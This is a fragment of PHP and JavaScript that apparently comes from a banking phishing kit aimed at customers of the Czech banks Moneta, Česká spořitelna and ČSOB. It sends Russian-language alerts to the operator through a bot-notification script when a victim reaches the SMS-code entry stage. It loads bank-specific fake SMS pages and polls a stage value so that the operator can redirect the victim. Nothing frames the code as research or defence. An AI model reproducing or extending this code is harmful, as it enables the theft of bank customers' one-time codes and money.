...
if ($dbconn) {
  ...
  if ($result) {
      ...
      $currStageText = '📩Переход на ввод SMS <b>' . $bank_name . '</b>';
      require 'botNotification.php';

// Заменяем значение "bank" на нормальное название банка
switch ($bank) {
    case 'moneta':
        include 'moneta/monetasms.php';
        break;
    case 'sporitelna':
        include 'sporitelna/CeskaSMS.php';
        break;
    case 'csob': 
        include 'csob/csobsms.php';
        break;
    default:
    ...
    function checkStage() {
        $.ajax({
            ...
            success: function (stage) {
                ...
                if (!isRedirecting && !currentUrl.includes(stage) && stage != 'sms' && stage != '') {
                    console.log(stage)
